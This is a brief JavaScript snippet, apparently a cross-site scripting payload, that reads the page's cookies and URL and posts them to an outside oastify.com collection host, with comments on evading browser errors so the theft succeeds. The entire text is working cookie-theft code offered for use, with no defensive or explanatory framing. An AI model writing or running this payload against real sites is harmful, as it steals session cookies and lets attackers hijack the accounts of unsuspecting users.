// Simple fetch exfiltration without restricted headers
fetch('https://mxnsskj6e98b6ppkq7vv2j4y6pcg09oy.oastify.com', {
    method: 'POST',
    mode: 'no-cors', // Essential for cross-origin exfiltration
    // We do NOT set headers: { 'Content-Type': 'application/json' } here
    // This avoids the TypeError: NetworkError
    body: "cookie_data=" + encodeURIComponent(document.cookie) + 
          "&origin=" + encodeURIComponent(window.location.href)
})
.then(() => console.log("✅ Cookie data sent to Oastify."))
.catch((err) => console.log("❌ Still failing: ", err));
